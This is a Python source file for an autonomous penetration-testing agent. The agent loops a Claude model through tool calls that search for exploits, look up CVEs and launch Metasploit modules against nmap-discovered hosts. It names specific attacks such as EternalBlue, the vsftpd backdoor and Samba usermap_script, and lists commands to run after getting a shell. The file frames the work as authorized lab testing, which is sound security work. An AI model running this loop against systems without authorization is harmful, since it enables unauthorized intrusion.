"""
agent.py — Penetration Testing Agent using Anthropic Native Tool Use

Implements an agentic loop that autonomously reasons over each target host,
selects and calls tools (exploit search, CVE lookup, Metasploit execution),
and returns structured findings for report generation.

Service modes:
    default  — top 6 highest-priority services only (fastest, cheapest)
    targeted — only the specific ports/services passed in via --services
    full     — all discovered services (slowest, most thorough)
"""

import os
from dotenv import load_dotenv
import anthropic

from tools.retriever import search_exploits
from tools.cve_lookup import lookup_cve
from tools.msf_exec import parse_and_run

load_dotenv()

# ── Service priority list (default mode) ─────────────────────────────────────
PRIORITY_SERVICES = [
    "ftp", "irc", "netbios-ssn", "microsoft-ds",
    "http", "ajp13",
    "mysql", "postgresql", "ms-sql",
    "ssh", "telnet", "rsh", "rlogin",
    "java-rmi", "bindshell", "vnc",
    "smtp", "nfs", "rpcbind",
]

DEFAULT_MAX_SERVICES = 6

# ── Anthropic client ──────────────────────────────────────────────────────────
client = anthropic.Anthropic(api_key=os.getenv("ANTHROPIC_API_KEY"))

# ── Tool schemas for Anthropic native tool use ────────────────────────────────
TOOLS = [
    {
        "name": "search_exploits_tool",
        "description": "Search the hybrid RAG knowledge base for exploit techniques. Input: service name and version like 'vsftpd 2.3.4'.",
        "input_schema": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Service name and version to search for"}
            },
            "required": ["query"]
        }
    },
    {
        "name": "lookup_cve_tool",
        "description": "Look up CVEs for a product using NIST NVD. Input: product name and version like 'vsftpd 2.3.4'.",
        "input_schema": {
            "type": "object",
            "properties": {
                "keyword": {"type": "string", "description": "Product name and version"}
            },
            "required": ["keyword"]
        }
    },
    {
        "name": "run_exploit_tool",
        "description": 'Run a Metasploit exploit module against the target. Input: JSON string with module, options, and _os_hint. Example: {"module": "exploit/unix/ftp/vsftpd_234_backdoor", "options": {"RHOSTS": "192.168.211.128"}, "_os_hint": "linux"}',
        "input_schema": {
            "type": "object",
            "properties": {
                "json_input": {"type": "string", "description": "JSON string with module, options, and _os_hint"}
            },
            "required": ["json_input"]
        }
    }
]


def call_tool(name: str, inputs: dict) -> str:
    """Dispatch a tool call to the appropriate function."""
    if name == "search_exploits_tool":
        return search_exploits(inputs["query"])
    elif name == "lookup_cve_tool":
        return lookup_cve(inputs["keyword"])
    elif name == "run_exploit_tool":
        return parse_and_run(inputs["json_input"])
    return f"Unknown tool: {name}"


# ── Service filtering ─────────────────────────────────────────────────────────

def filter_services(target: dict, mode: str = "default", ports: list = None) -> dict:
    """
    Filter a target's services based on the selected scan mode.

    Args:
        target (dict): Target dict with 'ip' and 'services' from parser.
        mode (str): One of 'default', 'targeted', 'full'.
        ports (list): List of port strings (only used in 'targeted' mode).

    Returns:
        dict: Target dict with filtered services list.
    """
    services = target.get("services", [])

    if mode == "full":
        return target

    if mode == "targeted" and ports:
        filtered = [s for s in services if str(s.get("port", "")) in ports]
        if filtered:
            return {**target, "services": filtered}

    def priority_rank(svc):
        svc_name = svc.get("service", "").lower()
        try:
            return PRIORITY_SERVICES.index(svc_name)
        except ValueError:
            return len(PRIORITY_SERVICES)

    ranked = sorted(services, key=priority_rank)
    return {**target, "services": ranked[:DEFAULT_MAX_SERVICES]}


# ── OS detection ──────────────────────────────────────────────────────────────

def detect_os(target: dict) -> str:
    """
    Infer the target OS from nmap service fingerprints.

    Args:
        target (dict): Single target dict with 'services' list.

    Returns:
        str: 'windows' or 'linux'.
    """
    windows_keywords = [
        "windows", "microsoft", "ms-sql", "iis", "rdp",
        "microsoft-ds", "netbios", "msrpc",
    ]
    for svc in target.get("services", []):
        combined = (
            svc.get("product", "") +
            svc.get("service", "") +
            svc.get("version", "")
        ).lower()
        if any(kw in combined for kw in windows_keywords):
            return "windows"
    return "linux"


# ── Agent runner ──────────────────────────────────────────────────────────────

def run_agent_on_target(target: dict, mode: str = "default", ports: list = None) -> str:
    """
    Run the agentic loop against a single target host using Anthropic native tool use.

    Args:
        target (dict): Single target dict with 'ip' and 'services' from parser.
        mode (str): Service filter mode — 'default', 'targeted', or 'full'.
        ports (list): Specific ports to target (only used when mode='targeted').

    Returns:
        str: Agent's final output describing exploitation results and findings.
    """
    filtered_target = filter_services(target, mode=mode, ports=ports)
    os_hint = detect_os(filtered_target)
    ip = filtered_target.get("ip", "unknown")
    num_services = len(filtered_target.get("services", []))

    if os_hint == "windows":
        os_specific = """
WINDOWS TARGET GUIDANCE:
- Try MS17-010 EternalBlue first if SMB (445) is open
- Try MSSQL xp_cmdshell if SQL Server (1433) is open
- Use _os_hint: "windows" in all run_exploit_tool calls
- After getting a shell try: whoami, ipconfig, systeminfo
"""
    else:
        os_specific = """
LINUX TARGET GUIDANCE:
- Try vsftpd 2.3.4 backdoor first if FTP (21) is open
- Try UnrealIRCd backdoor if IRC (6667) is open
- Try Samba usermap_script if SMB (139/445) is open
- Use _os_hint: "linux" in all run_exploit_tool calls
- After getting a shell try: id, whoami, uname -a
"""

    system_prompt = f"""You are a penetration testing agent operating against authorized sandboxed lab targets only.
Use the provided tools to assess the target. Stop as soon as you get a successful shell and summarize findings.
Only target {ip}. Be concise."""

    user_message = f"""Target: {ip}
OS: {os_hint.upper()}
Mode: {mode.upper()} ({num_services} services)
Services: {filtered_target}

{os_specific}

For each service:
1. Use search_exploits_tool to find attack techniques
2. Use lookup_cve_tool to get CVE details
3. Use run_exploit_tool to attempt exploitation with _os_hint: "{os_hint}"

IMPORTANT: Stop immediately after a successful shell and summarize all findings."""

    # ── Exploit selector setup ───────────────────────────────────────────────
    from exploit_selector import parse_exploits_from_agent, present_exploit_menu
    from tools.msf_exec import parse_and_run as _original_run
    import json as _json

    messages = [{"role": "user", "content": user_message}]
    max_iterations = 25

    for _ in range(max_iterations):
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=2048,
            system=system_prompt,
            tools=TOOLS,
            messages=messages,
        )

        # Add assistant response to conversation history
        messages.append({"role": "assistant", "content": response.content})

        # If Claude is done reasoning, return its final text
        if response.stop_reason == "end_turn":
            for block in response.content:
                if hasattr(block, "text"):
                    return block.text
            return "Agent completed with no text output."

        # Process tool calls and feed results back
        tool_results = []
        for block in response.content:
            if block.type == "tool_use":
                result = call_tool(block.name, block.input)
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": block.id,
                    "content": str(result),
                })

        if tool_results:
            messages.append({"role": "user", "content": tool_results})
        else:
            break

    return "Agent reached maximum iterations. Check partial findings in report."


def run_agent_on_target_with_selection(target: dict, mode: str = "default", ports: list = None) -> str:
    """
    Wrapper around run_agent_on_target that adds exploit selection menu.
    Runs the agent for reasoning only first, then presents exploit menu,
    then executes selected exploits via Metasploit.
    """
    from exploit_selector import parse_exploits_from_agent, present_exploit_menu

    ip = target.get("ip", "unknown")
    os_hint = detect_os(target)

    # Run agent in reasoning-only mode first (no Metasploit)
    reasoning_output = run_agent_on_target(target, mode=mode, ports=ports)

    # Parse exploit paths from agent reasoning
    exploits = parse_exploits_from_agent(reasoning_output, ip, os_hint)

    if not exploits:
        return reasoning_output

    # Present selection menu (auto if 1, menu if multiple)
    selected = present_exploit_menu(exploits, ip)

    if not selected:
        return reasoning_output + "\n\nExploitation skipped by user."

    # Execute selected exploits
    results = [reasoning_output]
    for exploit in selected:
        from banner import status, success, warn
        status(f"Executing: {exploit['description']} against {ip}")
        json_input = {
            "module":   exploit["module"],
            "options":  exploit.get("options", {"RHOSTS": ip}),
            "_os_hint": exploit.get("os_hint", os_hint),
        }
        import json
        result = parse_and_run(json.dumps(json_input))
        results.append(f"[Exploit: {exploit['description']}]\n{result}")
        if "[+] EXPLOITED" in result:
            success(f"Shell acquired via {exploit['description']}")
            break

    return "\n".join(results)


def run_agent(targets: list, mode: str = "default", ports: list = None) -> dict:
    """
    Run the agent against each target host independently.

    Args:
        targets (list): List of target dicts from parser.parse_nmap().
        mode (str): Service filter mode — 'default', 'targeted', or 'full'.
        ports (list): Specific ports to investigate (only used when mode='targeted').

    Returns:
        dict: Mapping of IP address to agent findings string.
    """
    results = {}
    for target in targets:
        ip = target.get("ip", "unknown")
        results[ip] = run_agent_on_target_with_selection(target, mode=mode, ports=ports)
    return results

